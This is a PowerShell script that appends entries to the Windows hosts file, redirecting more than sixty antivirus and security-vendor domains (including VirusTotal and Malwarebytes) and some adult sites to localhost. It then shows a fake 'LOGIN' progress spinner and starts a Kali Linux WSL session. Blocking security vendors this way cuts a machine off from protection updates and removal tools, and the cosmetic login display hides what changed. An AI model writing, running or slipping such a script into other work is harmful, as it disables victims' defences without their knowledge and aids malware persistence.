
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value @"
127.0.0.1 avast.com
127.0.0.1 www.avast.com
127.0.0.1 norton.com
127.0.0.1 www.norton.com
127.0.0.1 mcafee.com
127.0.0.1 www.mcafee.com
127.0.0.1 avg.com
127.0.0.1 www.avg.com
127.0.0.1 avira.com
127.0.0.1 www.avira.com
127.0.0.1 kaspersky.com
127.0.0.1 www.kaspersky.com
127.0.0.1 bitdefender.com
127.0.0.1 www.bitdefender.com
127.0.0.1 panda.org
127.0.0.1 www.panda.org
127.0.0.1 eset.com
127.0.0.1 www.eset.com
127.0.0.1 sophos.com
127.0.0.1 www.sophos.com
127.0.0.1 trendmicro.com
127.0.0.1 www.trendmicro.com
127.0.0.1 f-secure.com
127.0.0.1 www.f-secure.com
127.0.0.1 malwarebytes.com
127.0.0.1 www.malwarebytes.com
127.0.0.1 comodo.com
127.0.0.1 www.comodo.com
127.0.0.1 clamav.net
127.0.0.1 www.clamav.net
127.0.0.1 vipre.com
127.0.0.1 www.vipre.com
127.0.0.1 webroot.com
127.0.0.1 www.webroot.com
127.0.0.1 zonealarm.com
127.0.0.1 www.zonealarm.com
127.0.0.1 gdata.de
127.0.0.1 www.gdata.de
127.0.0.1 silky-software.com
127.0.0.1 www.silky-software.com
127.0.0.1 totalav.com
127.0.0.1 www.totalav.com
127.0.0.1 nortonsecurityonline.com
127.0.0.1 www.nortonsecurityonline.com
127.0.0.1 defendedge.com
127.0.0.1 www.defendedge.com
127.0.0.1 aegislabs.com
127.0.0.1 www.aegislabs.com
127.0.0.1 securitycoverage.com
127.0.0.1 www.securitycoverage.com
127.0.0.1 quickheal.com
127.0.0.1 www.quickheal.com
127.0.0.1 sparktrust.com
127.0.0.1 www.sparktrust.com
127.0.0.1 rising.com.cn
127.0.0.1 www.rising.com.cn
127.0.0.1 drweb.com
127.0.0.1 www.drweb.com
127.0.0.1 etrust.com
127.0.0.1 www.etrust.com
127.0.0.1 michelfoster.com
127.0.0.1 www.michelfoster.com
127.0.0.1 bsecure.com
127.0.0.1 www.bsecure.com
127.0.0.1 quickheal.co.in
127.0.0.1 www.quickheal.co.in
127.0.0.1 truscan.com
127.0.0.1 www.truscan.com
127.0.0.1 safeweb.com
127.0.0.1 www.safeweb.com
127.0.0.1 fortinet.com
127.0.0.1 www.fortinet.com
127.0.0.1 drsantos.com
127.0.0.1 www.drsantos.com
127.0.0.1 immunet.com
127.0.0.1 www.immunet.com
127.0.0.1 cybereason.com
127.0.0.1 www.cybereason.com
127.0.0.1 vipresecurity.com
127.0.0.1 www.vipresecurity.com
127.0.0.1 microworld.in
127.0.0.1 www.microworld.in
127.0.0.1 elite-security.com
127.0.0.1 www.elite-security.com
127.0.0.1 nortonsecurity.com
127.0.0.1 www.nortonsecurity.com
127.0.0.1 virustotal.com
127.0.0.1 www.virustotal.com
127.0.0.1 ccleaner.com
127.0.0.1 www.ccleaner.com
127.0.0.1 secunia.com
127.0.0.1 www.secunia.com
127.0.0.1 malwarescanner.com
127.0.0.1 www.malwarescanner.com
127.0.0.1 antivir.com
127.0.0.1 www.antivir.com
127.0.0.1 fprot.com
127.0.0.1 www.fprot.com
127.0.0.1 vipersecurity.com
127.0.0.1 www.vipersecurity.com
127.0.0.1 antivirus360.com
127.0.0.1 www.antivirus360.com
127.0.0.1 webrootsecureanywhere.com
127.0.0.1 www.webrootsecureanywhere.com
127.0.0.1 xvideos.com
127.0.0.1 www.xvideos.com
127.0.0.1 www.pornhub.com
127.0.0.1 youporn.com
127.0.0.1 www.youporn.com
127.0.0.1 redtube.com
127.0.0.1 www.redtube.com
127.0.0.1 tube8.com
127.0.0.1 www.tube8.com
127.0.0.1 xnxx.com
127.0.0.1 www.xnxx.com
127.0.0.1 brazzers.com
127.0.0.1 www.brazzers.com
127.0.0.1 naughtyamerica.com
127.0.0.1 www.naughtyamerica.com
127.0.0.1 adultfriendfinder.com
127.0.0.1 www.adultfriendfinder.com
"@
Write-Host "Processando..." -ForegroundColor DarkGreen

$frames = @("|", "/", "-", "\")
for ($i = 0; $i -lt 30; $i++) {
    $frame = $frames[$i % $frames.Length]
    Write-Host "`rLOGIN [$frame]" -NoNewline -ForegroundColor Magenta
    Start-Sleep -Milliseconds 100
}
Write-Host "`rLOGIN [OK]    " -ForegroundColor Green
wsl -d kali-linux